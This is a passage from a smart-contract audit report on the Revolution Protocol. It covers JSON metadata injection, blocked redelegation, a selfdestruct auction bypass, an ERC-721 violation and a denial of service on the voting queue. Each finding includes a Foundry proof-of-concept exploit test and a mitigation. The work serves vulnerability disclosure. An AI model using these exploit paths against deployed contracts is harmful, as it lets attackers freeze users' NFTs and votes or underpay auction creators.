        assertEq(keccak256('data:application/json;base64,'), keccak256(bytes(prefix)));
        string memory actualBase64Encoded = _substring(encodedURI, 29, bytes(encodedURI).length);
        string memory expectedBase64Encoded = 'eyJuYW1lIjoiVnJiIDAiLCAiZGVzY3JpcHRpb24iOiJNb25hIExpc2EuIEEgcmVub3duZWQgcGFpbnRpbmcgYnkgTGVvbmFyZG8gZGEgVmluY2kiLCAiaW1hZ2UiOiAiaXBmczovL3JlYWxNb25hTGlzYSIsICJhbmltYXRpb25fdXJsIjogIiIsICJpbWFnZSI6ICJpcGZzOi8vZmFrZU1vbmFMaXNhIn0=';
        assertEq(keccak256(bytes(expectedBase64Encoded)), keccak256(bytes(actualBase64Encoded)));
    }

    function _createArtPieceCreators() internal pure returns (ICultureIndex.CreatorBps[] memory) {
        ICultureIndex.CreatorBps[] memory creators = new ICultureIndex.CreatorBps[](1);
        creators[0] = ICultureIndex.CreatorBps({creator: address(0xc), bps: 10_000});
        return creators;
    }

    function _substring(string memory str, uint256 startIndex, uint256 endIndex)
        internal
        pure
        returns (string memory)
    {
        bytes memory strBytes = bytes(str);
        bytes memory result = new bytes(endIndex-startIndex);
        for (uint256 i = startIndex; i < endIndex; i++) {
            result[i - startIndex] = strBytes[i];
        }
        return string(result);
    }
}
```
</details>

And, test logs:

```solidity
2023-12-revolutionprotocol\packages\revolution> forge test --match-contract JsonInjectionAttackTest -vv
[⠑] Compiling...
No files changed, compilation skipped

Running 1 test for test/JsonInjectionAttack.t.sol:JsonInjectionAttackTest
[PASS] testImageReplacementAttack() (gas: 1437440)
Logs:
  data:application/json;base64,eyJuYW1lIjoiVnJiIDAiLCAiZGVzY3JpcHRpb24iOiJNb25hIExpc2EuIEEgcmVub3duZWQgcGFpbnRpbmcgYnkgTGVvbmFyZG8gZGEgVmluY2kiLCAiaW1hZ2UiOiAiaXBmczovL3JlYWxNb25hTGlzYSIsICJhbmltYXRpb25fdXJsIjogIiIsICJpbWFnZSI6ICJpcGZzOi8vZmFrZU1vbmFMaXNhIn0=

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 16.30ms
Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

### Recommended Mitigation Steps

Sanitize input data according: <https://github.com/OWASP/json-sanitizer>

**[rocketman-21 (Revolution) confirmed](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/167#issuecomment-1875959168)**

**[0xTheC0der (Judge) commented](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/167#issuecomment-1879698395):**
 > Looks like a `Medium` at the first glance, but after some thought `High` severity seems appropriate due to assets being compromised in a pretty straight-forward way.
>
> 1. The front-end part of the present issue is definitely QA but is part of a more severe correctly identified root cause, see point 4.
> 2. The purpose of using IPFS is *immutability*. Thus, the art piece cannot be simply changed on the server. If users vote on an NFT where the underlying art is hosted on a normal webserver, it's user error.
> 3. I agree that the provided example findings are QA due to lack of impact on contract/protocol level.
> 4. The critical part of this attack is that the art piece (IPFS link) that is voted on will differ from the art piece (IPFS link) in the minted VerbsToken which makes this an issue on protocol level where assets are compromised and users will be misled as a result.
> 
>On the one hand, users have to be careful and review their actions responsibly, but on the other hand it's any protocol's duty to protect users to a certain degree (example: slippage control). 
>
> Here, multiple users are put at risk because of one malicious user.  
>
> Furthermore, due to the voting mechanism and later minting, users are exposed to a risk that is not as clear to see as if they could see the final NFT from the beginning. 
>
> I have to draw the line somewhere and here it becomes evident that the protocol's duty to protect it's users outweighs the required user scrutiny.

_Note: See full discussion [here](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/167)._

***

## [[H-04] Malicious delegatees can block delegators from redelegating and from sending their NFTs](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/49)
*Submitted by [bart1e](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/49), also found by [0xDING99YA](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/344), [BowTiedOriole](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/682), and [Ward](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/627)*

<https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/base/VotesUpgradeable.sol#L166> 

<https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/base/VotesUpgradeable.sol#L235-L244> 

<https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/base/ERC721CheckpointableUpgradeable.sol#L41>

If user `X` delegates his votes to `Y`, `Y` can block `X` from redelegating and even from sending his NFT anywhere, forever.

### Detailed description

Users can acquire votes in two ways:

*   by having some `NontransferableERC20Votes` tokens
*   by having `VerbsToken` tokens

It is possible for them to delegate their votes to someone else. It is handled in the `VotesUpgradable` contract, that is derived from OpenZeppelin's `VotesUpgradable` and the following change is made with respect to the original implementation:

```diff
function delegates(address account) public view virtual returns (address) {
-        return $._delegatee[account];
+        return $._delegatee[account] == address(0) ? account : $._delegatee[account];
```

It is meant to be a convenience feature so that users don't have to delegate to themselves in order to be able to vote. However, it has very serious implications.

In order to see that, let's look at the `_moveDelegateVotes` function that is invoked every time someone delegates his votes or wants to transfer a voting token (`VerbsToken` in this case as `NontransferableERC20Votes` is non-transferable):

```solidity
    function _moveDelegateVotes(address from, address to, uint256 amount) private {
        VotesStorage storage $ = _getVotesStorage();
        if (from != to && amount > 0) {
            if (from != address(0)) {
                (uint256 oldValue, uint256 newValue) = _push(
                    $._delegateCheckpoints[from],
                    _subtract,
                    SafeCast.toUint208(amount)
                );
                emit DelegateVotesChanged(from, oldValue, newValue);
            }
            if (to != address(0)) {
                (uint256 oldValue, uint256 newValue) = _push(
                    $._delegateCheckpoints[to],
                    _add,
                    SafeCast.toUint208(amount)
                );
                emit DelegateVotesChanged(to, oldValue, newValue);
            }
        }
    }
```

As can be seen, it subtracts votes from current delegatee and adds them to the new one. There are 2 edge cases here:

*   `from == address(0)`, which is the case when current delegatee equals `0`
*   `to == address(0)`, which is the case when users delegates to `0`

If any of these conditions hold, only one of `$._delegateCheckpoints` is updated. This is fine in the original implementation as the function ignores cases when `from == to` and if function updates only `$._delegateCheckpoints[from]` it means that a user was delegating to `0` and when he changes delegatee, votes only should be added to some account, not subtracted from any account. Similarly, if the function updates only  `$._delegateCheckpoints[to]`, it means that user temporarily removes his votes from the system and hence his current delegatee's votes should be subtracted and not added into any other account.

As long as user cannot cause this function to update one of `$._delegateCheckpoints[from]` and `$._delegateCheckpoints[to]` several times in a row, it works correctly. It is indeed the case in the original OpenZeppelin's implementation as when `from == to`, function doesn't perform any operation.

**However, the problem with the current implementation is that it is possible to call this function with `to == 0` several times in a row.** In order to see it, consider the `_delegate` function which is called when users want to (re)delegate their votes:

```solidity
    function _delegate(address account, address delegatee) internal virtual {
        VotesStorage storage $ = _getVotesStorage();
        address oldDelegate = delegates(account);
        $._delegatee[account] = delegatee;


        emit DelegateChanged(account, oldDelegate, delegatee);
        _moveDelegateVotes(oldDelegate, delegatee, _getVotingUnits(account));
    }
```

As we can see, it calls `_moveDelegateVotes`, but with `oldDelegate` equal to `delegates(account)`. **But if `$._delegatee[account] == address(0)`, that function returns `account`**.

It means that `_moveDelegateVotes` can be called several times in a row with parameters `(account, 0, _getVotingUnits(account))`. In other words, if user delegates to `address(0)`, he will be able to do it several times in a row as `from` will be different than `to` in `_moveDelegateVotes` and the function will subtract his amount of votes from his `$._delegateCheckpoints` every time.

It may seem that a user `X` who delegates to `address(0)` multiple times will only harm himself, but it's not true as someone else can delegate to him and each time he delegates to `0`, his original voting power will be subtracted from his `$._delegateCheckpoints`, making it `0` or some small, value. If a user `Y` who delegated to `X` wants to redelegate to someone else or transfer his tokens, `_moveDelegateVotes` will revert with integer underflow as it will try to subtract `Y`'s votes from `$._delegateCheckpoints[X]`, but it will already be either a small number or even `0` meaning that `Y` will be unable to transfer his tokens or redelegate.

### Impact

Victims of the exploit presented above will neither be able to transfer their NFTs (the same would be true for `NontransferableERC20Votes`, but it's not transferable by design) nor to even redelegate back to themselves or to any other address.

While it can be argued that users will only delegate to users they trust, I argue that the issue is of High severity because of the following reasons:

*   Possibility of delegating is implemented in the code and it's expected to be used.
*   Every user who uses it risks the loss of access to all his NFTs and to redelegating his votes.
*   Even when delegatees are trusted, it still shouldn't be possible for them to block redelegating and blocking access to NFTs of their delegators; if delegators stop trusting delegatees, they should have a possibility to redelegate back, let alone to have access to their own NFTs, which is not the case in the current implementation.
*   The attack is not costly for the attacker as he doesn't have to lose any tokens - for instance, if he has `1` NFT and the victim who delegates to him has `10`, he can delegate to `address(0)` `10` times and then transfer his NFT to a different address - it will still block his victim and the attacker wouldn't lose anything.

### Proof of Concept

Please put the following test into the `Voting.t.sol` file and run it. It shows how a victim loses access to all his votes and all his NFTs just by delegating to someone:

<details>

```solidity
    function testBlockingOfTransferAndRedelegating() public
    {
        address user = address(0x1234);
        address attacker = address(0x4321);

        vm.stopPrank();

        // create 3 random pieces
        createDefaultArtPiece();
        createDefaultArtPiece();
        createDefaultArtPiece();

        // transfer 2 pieces to normal user and 1 to the attacker
        vm.startPrank(address(auction));
        erc721Token.mint();
        erc721Token.transferFrom(address(auction), user, 0);

        erc721Token.mint();
        erc721Token.transferFrom(address(auction), user, 1);

        erc721Token.mint();
        erc721Token.transferFrom(address(auction), attacker, 2);

        vm.stopPrank();
        
        // user delegates his votes to attacker
        vm.prank(user);
        erc721Token.delegate(attacker);

        // attacker delegates to address(0) multiple times, blocking user from redelegating
        vm.prank(attacker);
        erc721Token.delegate(address(0));

        vm.prank(attacker);
        erc721Token.delegate(address(0));

        // now, user cannot redelegate
        vm.prank(user);
        vm.expectRevert();
        erc721Token.delegate(user);

        // attacker transfer his only NFT to an address controlled by himself
        // he doesn't lose anything, but he still trapped victim's votes and NFTs
        vm.prank(attacker);
        erc721Token.transferFrom(attacker, address(0x43214321), 2);

        // user cannot transfer any of his NTFs either
        vm.prank(user);
        vm.expectRevert();
        erc721Token.transferFrom(user, address(0x1234567890), 0);
    }
```
</details>

### Tools Used

VS Code

### Recommended Mitigation Steps

Do not allow users to delegate to `address(0)`.

**[rocketman-21 (Revolution) confirmed and commented](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/49#issuecomment-1885578994):**
 > This is valid, major find thank you so much.
> 
> Proposed fix here:
> https://github.com/collectivexyz/revolution-protocol/commit/ef2a492e93e683f5d9d8c77cbcf3622bb936522a

**[0xTheC0der (Judge) commented](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/49#issuecomment-1885621992):**
 > Warden has shown how assets can be permanently frozen.

***
# Medium Risk Findings (14)
## [[M-01] Bidder can use donations to get VerbsToken from auction that already ended](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/515)
*Submitted by [jnforja](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/515), also found by [0x175](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/594), [McToady](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/548), [mahdirostami](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/546), [MrPotatoMagic](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/462), [mojito\_auditor](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/443), [deth](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/439), [0xDING99YA](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/389), [TermoHash](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/244), [\_eperezok](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/192), [0xCiphky](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/749), [ktg](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/748), and imare ([1](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/747), [2](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/531))*

<https://github.com/code-423n4/2023-12-revolutionprotocol/blob/main/packages/revolution/src/AuctionHouse.sol#L348> 

<https://github.com/code-423n4/2023-12-revolutionprotocol/blob/main/packages/revolution/src/AuctionHouse.sol#L365-L368>

*   Token will be auctioned off without following the intended rules resulting in an unfair auction.
*   Loss of funds for Creators and AuctionHouse owner.

### Proof of Concept

For this attack to be possible it's necessary that the following happens in the shown order:

1.  Attacker created a bid.
2.  `AuctionHouse::reservePrice` is increased to a value superior to the already placed bid.
3.  No new bid is created after `AuctionHouse::reservePrice` is called and the auction ends.
4.  Attacker donates through `selfdestruct` to `AuctionHouse` the minimum necessary to have `address(AuctionHouse).balance` be greater or equal to `AuctionHouse::reservePrice`.
5.  Auction is settled.
6.  Attacker will get the token and creators and AuctionHouse owner will be paid less than expected since their pay will be computed based on `_auction.amount` which is lower than the set `reservePrice`.

To execute the following code copy paste it into `AuctionSettling.t.sol`

<details>

```solidity
 function testCircumventsMostCreateBidRestrictionsThroughDonationAndReducesTokenPayments() public {
        createDefaultArtPiece();
        auction.unpause();

        uint256 balanceBefore = address(dao).balance;

        uint256 bidAmount = auction.reservePrice();
        uint256 reservePriceIncrease = 0.1 ether;
        address bidder = address(11);
        vm.deal(bidder, bidAmount + reservePriceIncrease);
        vm.startPrank(bidder);
        auction.createBid{ value: bidAmount }(0, bidder); // Assuming first auction's verbId is 0
        vm.stopPrank();

        vm.startPrank(auction.owner());
        // After setting new ReservePrice current bid won't be enough to win the auction
        auction.setReservePrice(auction.reservePrice() + reservePriceIncrease);
        assertGt(auction.reservePrice(), bidAmount);
        vm.stopPrank();

        vm.warp(block.timestamp + auction.duration()); // Fast forward time to end the auction

        vm.startPrank(bidder);
        ContractDonatesEthThroughSelfdestruct donor = new ContractDonatesEthThroughSelfdestruct{value: reservePriceIncrease}();
        donor.donate(payable(address(auction)));
        auction.settleCurrentAndCreateNewAuction();

        //Through donation bidder was able to get the token even though the auction had already ended.
        assertEq(erc721Token.ownerOf(0), bidder);

        //Since payments are calculated using _auction.amount all the involved parties will get
        //less than they would if reservePrice had been respected.
        //Code below shows payments were calculated based on bidAmount which is less than the reservePrice.
        uint256 balanceAfter = address(dao).balance;

        uint256 creatorRate = auction.creatorRateBps();
        uint256 entropyRate = auction.entropyRateBps();

        //calculate fee
        uint256 amountToOwner = (bidAmount * (10_000 - (creatorRate * entropyRate) / 10_000)) / 10_000;

        //amount spent on governance
        uint256 etherToSpendOnGovernanceTotal = (bidAmount * creatorRate) /
            10_000 -
            (bidAmount * (entropyRate * creatorRate)) /
            10_000 /
            10_000;
        uint256 feeAmount = erc20TokenEmitter.computeTotalReward(etherToSpendOnGovernanceTotal);

        assertEq(
            balanceAfter - balanceBefore,
            amountToOwner - feeAmount
        );
    }

Contract ContractDonatesEthThroughSelfdestruct {
    constructor() payable {}

    function donate(address payable target) public {
        selfdestruct(target);
    }
}
```
</details>

### Recommended Mitigation Steps

Execute the following diff at `AuctionHouse::_settleAuction` :

```diff
- if (address(this).balance < reservePrice) {
+ if (_auction.amount < reservePrice) {
```

**[rocketman-21 (Revolution) confirmed and commented](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/515#issuecomment-1883873532):**
Ideally the DAO would wait to update the reserve price to line up with the start of a new auction, to ensure some bids will come in. Your call ultimately @0xTheC0der I implemented the fix in any case.


**[0xTheC0der (Judge) commented](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/515#issuecomment-1883903471):**
 > Thanks for the input!
> 
> > **Ideally** the DAO would wait to update the reserve price to line up with the start of a new auction
> 
> It's reasonable to assume that this is **not** always the case, therefore this group of issues remains valid.
> 
> The root cause is the change of parameters mid-auction, while the usage of selfdestruct is "just" a very impactful attack path.

_Note: See full discussion [here](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/515)._

***

## [[M-02] Violation of ERC-721 Standard in VerbsToken:tokenURI Implementation](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/471)
*Submitted by [pep7siup](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/471), also found by [shaka](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/660), imare ([1](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/535), [2](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/534)), [hals](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/511), [XDZIBECX](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/308), [ZanyBonzy](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/268), [\_eperezok](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/191), and [Ocean\_Sky](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/137)*

The VerbsToken contract deviates from the ERC-721 standard, specifically in the `tokenURI` implementation. According to the standard, the `tokenURI` method must revert if a non-existent `tokenId` is passed. In the VerbsToken contract, this requirement was overlooked, leading to a violation of the EIP-721 specification and breaking the invariants declared in the protocol's README.

### Proof of Concept

The responsibility for checking whether a token exists may be argued to be placed on the `descriptor`. However, the core VerbsToken contract, which is expected to adhere to the invariant stated in the Protocol's README, does not follow the specification.

```markdown
// File: README.md
414:## EIP conformity
415:
416:- [VerbsToken](https://github.com/code-423n4/2023-12-revolutionprotocol/blob/main/packages/revolution/src/VerbsToken.sol): Should comply with `ERC721`
```

Note: the original [NounsToken](https://github.com/nounsDAO/nouns-monorepo/blob/61d2b50ce82bb060cf4281a55adddf47c5085881/packages/nouns-contracts/contracts/NounsToken.sol#L169) contract, which VerbsToken was forked from, did implement the `tokenURI` function properly.

### Recommended Mitigation Steps

It is recommended to strictly adopt the implementation from the original NounsToken contract to ensure compliance with the ERC-721 standard.

```patch
    function tokenURI(uint256 tokenId) public view override returns (string memory) {
+        require(_exists(tokenId));
        return descriptor.tokenURI(tokenId, artPieces[tokenId].metadata);
    }
```

### References

1.  [EIP-721 Standard](https://eips.ethereum.org/EIPS/eip-721)
2.  [Code 423n4 Finding - Caviar](https://github.com/code-423n4/2023-04-caviar-findings/issues/44)
3.  [Code 423n4 Finding - OpenDollar](https://github.com/code-423n4/2023-10-opendollar-findings/issues/243)
4.  [NounsToken Contract Implementation](https://github.com/nounsDAO/nouns-monorepo/blob/61d2b50ce82bb060cf4281a55adddf47c5085881/packages/nouns-contracts/contracts/NounsToken.sol#L169)

**[0xTheC0der (Judge) commented](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/471#issuecomment-1887506249):**
 >I felt obliged to award with Medium severity due to precedent EIP-721 tokenUri cases (see https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/511#issuecomment-1883512625, one judged by Alex).
> 
> This should be discussed during the next SC round.

***

## [[M-03] `CultureIndex.sol#dropTopVotedPiece()` - Malicious user can manipulate topVotedPiece to DoS the whole CultureIndex and AuctionHouse](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/449)
*Submitted by [deth](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/449), also found by [deth](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/441), [roland](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/745), peanuts ([1](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/743), [2](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/213), [3](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/212)), [Aamir](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/742), [pontifex](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/665), [0xHelium](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/641), [Pechenite](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/603), [pep7siup](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/476), [AkshaySrivastav](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/450), [ast3ros](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/412), [ayden](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/400), [00xSEV](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/381), 0xCiphky ([1](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/338), [2](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/337)), [King\_](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/326), Tricko ([1](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/325), [2](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/292)), [fnanni](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/295), [ABAIKUNANBAEV](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/275), [y4y](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/148), [SpicyMeatball](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/114), [ke1caM](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/98), [ptsanev](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/67), [mahdirostami](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/43), [bart1e](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/42), and [rvierdiiev](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/16)*

`CultureIndex` is responsible for the creation, voting and dropping (auctioning off) art pieces.

Let’s focus on `dropTopVotedPiece` . The function is used by the `AuctionHouse`  to take the top voted art piece, drop it and auction it off.

```jsx
function dropTopVotedPiece() public nonReentrant returns (ArtPiece memory) {
        require(msg.sender == dropperAdmin, "Only dropper can drop pieces");

        ICultureIndex.ArtPiece memory piece = getTopVotedPiece(); 
        require(totalVoteWeights[piece.pieceId] >= piece.quorumVotes, "Does not meet quorum votes to be dropped.");
        

        //set the piece as dropped
        pieces[piece.pieceId].isDropped = true;

        //slither-disable-next-line unused-return
        maxHeap.extractMax();

        emit PieceDropped(piece.pieceId, msg.sender);

        return pieces[piece.pieceId];
    }
```

Notice how the top voted piece is retrieved and then we check if `totalVoteWeight > quorumVotes` . This is used to check if the piece has reached it’s quorum, which is cached during creation.

```jsx
newPiece.pieceId = pieceId;
        newPiece.totalVotesSupply = _calculateVoteWeight(
            erc20VotingToken.totalSupply(), 
            erc721VotingToken.totalSupply() 
        );
        newPiece.totalERC20Supply = erc20VotingToken.totalSupply(); 
        newPiece.metadata = metadata;
        newPiece.sponsor = msg.sender; 
        newPiece.creationBlock = block.number
        newPiece.quorumVotes = (quorumVotesBPS * newPiece.totalVotesSupply) / 10_000;
```

Notice that for `quorumVotes` we use the `erc20VotingToken.totalSupply` , `erc721VotingToken.totalSupply` and `quorumVotesBPS`.

Knowing all this, a malicious user can do the following to break `dropTopVotedPiece`  under certain conditions.

He will call `ERC20TokenEmitter#buyToken` to buy the voting token, which in turn will inflate the `erc20VotingToken.totalSupply` , which will also increase the `newPiece.quorumVotes` .

After this he will create a new bogus art piece and its quorum votes will be inflated (We are assuming that no one wants to vote for the art piece as it’s a bogus/fake art piece).

He will then vote for his new piece, making it the top voted piece, but the piece won’t reach it’s quorum so it cannot be dropped.

At this point one of the following can occur:

1.  Users will wait for a new piece to be created and become top voted, dropped and auctioned off. The protocol might work normally at this point, but once the bogus/fake piece becomes top voted again, it still can’t be dropped. If the quorum for the fake piece isn’t reached, it can never be dropped, meaning that all pieces that have less votes than it and are eligible to be dropped (they reached their quorum) can never be reached, since the fake piece can technically stay there forever.
2.  Users will be forced to vote for the bogus/fake piece in order to push it over it’s quorum so it can be dropped. Obviously this isn’t ideal as it requires to persuade users to spend gas to vote for something that they don’t want to, just so the protocol can continue working correctly. After the bogus piece gets dropped it needs to go into an auction, which has a `duration` so users will also have to wait for the auction to terminate, get settled and then the protocol can continue normally, which will waste time and increase the duration of the DoS.
3.  Users that voted for a piece that is eligible to be dropped, but doesn’t have more votes than the fake piece, will be forced to create a new piece and start voting on all over again. This isn’t ideal, as the `quorumVotes` for the piece will be different and it isn’t even sure that the new piece will be accepted under the new market conditions.

All 3 of the scenarios are bad for the normal execution of the protocol and especially under scenario 1, can leave pieces to just rot, as they can never be reached.

Note that the malicious user that does the attack, doesn’t lose any funds, as he is just paying to buy the voting token, also the attack scenario can happen on it’s own naturally, without the use of `buyToken` , but it will still lead to 1 of the 3 followup scenarios.

This scenario can happen naturally, without anyone being malicious and the attack doesn't rely on the fact that anyone can call `buyToken` , it just makes it easier.

The sponsor has stated that in the future there will contracts that interface with `buyToken` , so even if access control is added to the function, it still won't fix the issue.

> this is somewhat expected, but i'm not sure if it throws off the economics of the system, but ideally most people are interfacing with buyToken through the AuctionHouse, commerce contracts, or minting contracts, not buying directly.

### Proof of Concept

Create a folder inside `revolution/test` called `CustomTests` , create a new file called `CustomTests.t.sol` , paste the following inside and run `forge test --mt testTopVotedPieceCantReachQuorum -vvvv`.

<details>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import "forge-std/console.sol";
import { Test } from "forge-std/Test.sol";
import { unsafeWadDiv } from "../../src/libs/SignedWadMath.sol";
import { ERC20TokenEmitter } from "../../src/ERC20TokenEmitter.sol";
import { IERC20TokenEmitter } from "../../src/interfaces/IERC20TokenEmitter.sol";
import { NontransferableERC20Votes } from "../../src/NontransferableERC20Votes.sol";
import { RevolutionProtocolRewards } from "@collectivexyz/protocol-rewards/src/RevolutionProtocolRewards.sol";
import { wadDiv } from "../../src/libs/SignedWadMath.sol";
import { IRevolutionBuilder } from "../../src/interfaces/IRevolutionBuilder.sol";
import { RevolutionBuilderTest } from "../RevolutionBuilder.t.sol";
import { INontransferableERC20Votes } from "../../src/interfaces/INontransferableERC20Votes.sol";
import { ERC1967Proxy } from "../../src/libs/proxy/ERC1967Proxy.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { CultureIndex } from "../../src/CultureIndex.sol";
import { ICultureIndex } from "../../src/interfaces/ICultureIndex.sol";

contract ERC20TokenEmitterTest is RevolutionBuilderTest {
    event Log(string, uint);

    // 1,000 tokens per day is the target emission
    uint256 tokensPerTimeUnit = 1_000;

    uint256 expectedVolume = tokensPerTimeUnit * 1e18;

    string public tokenNamePrefix = "Vrb";

    function setUp() public override {
        super.setUp();
        super.setMockParams();

        super.setERC721TokenParams("Mock", "MOCK", "https://example.com/token/", tokenNamePrefix);

        int256 oneFullTokenTargetPrice = 1 ether;

        int256 priceDecayPercent = 1e18 / 10;

        super.setERC20TokenEmitterParams(
            oneFullTokenTargetPrice,
            priceDecayPercent,
            int256(1e18 * tokensPerTimeUnit),
            creatorsAddress
        );

        super.deployMock();

        vm.deal(address(0), 100000 ether);
    }

    function testTopVotedPieceCantReachQuorum() public {
        // Setup no fees for the creator for simplicity of the test and the values
        vm.startPrank(erc20TokenEmitter.owner());
        erc20TokenEmitter.setCreatorsAddress(address(1));
        erc20TokenEmitter.setCreatorRateBps(0);
        erc20TokenEmitter.setEntropyRateBps(0);
        vm.stopPrank();

        // Set quorumVotesBps to 6000 (60%)
        vm.prank(cultureIndex.owner());
        cultureIndex._setQuorumVotesBPS(6000);

        // Setup Alice, Bob and Charlie
        address alice = address(9);
        vm.deal(alice, 100000 ether);
        address bob = address(10);
        vm.deal(bob, 100000 ether);
        address charlie = address(11);
        vm.deal(charlie, 100000 ether);

        // Bob buys tokens
        address[] memory recipients = new address[](1);
        recipients[0] = bob;
        uint256[] memory bps = new uint256[](1);
        bps[0] = 10_000;

        vm.prank(bob);
        erc20TokenEmitter.buyToken{ value: 10e18 }(
            recipients,
            bps,
            IERC20TokenEmitter.ProtocolRewardAddresses({
                builder: address(0),
                purchaseReferral: address(0),
                deployer: address(0)
            })
        );

        // Charlie buys tokens
        recipients = new address[](1);
        recipients[0] = charlie;
        bps = new uint256[](1);
        bps[0] = 10_000;

        vm.prank(charlie);
        erc20TokenEmitter.buyToken{ value: 10e18 }(
            recipients,
            bps,
            IERC20TokenEmitter.ProtocolRewardAddresses({
                builder: address(0),
                purchaseReferral: address(0),
                deployer: address(0)
            })
        );

        // Alice buys tokens
        recipients = new address[](1);
        recipients[0] = alice;
        bps = new uint256[](1);
        bps[0] = 10_000;

        vm.prank(alice);
        erc20TokenEmitter.buyToken{ value: 10e18 }(
            recipients,
            bps,
            IERC20TokenEmitter.ProtocolRewardAddresses({
                builder: address(0),
                purchaseReferral: address(0),
                deployer: address(0)
            })
        );

        vm.roll(block.number + 10);

        // Bob creates a piece
        vm.prank(bob);
        uint256 bobsPiece = createDefaultArtPiece(bob);

        vm.roll(block.number + 10);

        // Bob votes for his piece
        vm.prank(bob);
        cultureIndex.vote(bobsPiece);

        // Bob's piece is the top voted one
        assertEq(cultureIndex.topVotedPieceId(), bobsPiece);

        // Bobs piece hasn't passed it's quorum
        ICultureIndex.ArtPiece memory piece = cultureIndex.getTopVotedPiece();
        assertLt(cultureIndex.totalVoteWeights(piece.pieceId), piece.quorumVotes);
        
        // Alice buys tokens again
        recipients = new address[](1);
        recipients[0] = alice;
        bps = new uint256[](1);
        bps[0] = 10_000;

        vm.prank(alice);
        erc20TokenEmitter.buyToken{ value: 15e18 }(
            recipients,
            bps,
            IERC20TokenEmitter.ProtocolRewardAddresses({
                builder: address(0),
                purchaseReferral: address(0),
                deployer: address(0)
            })
        );
        
        vm.roll(block.number + 1);

        // Alice creates a piece
        vm.prank(alice);
        uint256 alicesPiece = createDefaultArtPiece(alice);

        vm.roll(block.number + 1);
        // Alice votes on her piece next block
        // She votes enough to be the top voted piece, but not enough to pass her quorum
        vm.prank(alice);
        cultureIndex.vote(alicesPiece);
        
        // Now Alice's piece is the top voted one
        assertEq(cultureIndex.topVotedPieceId(), alicesPiece);

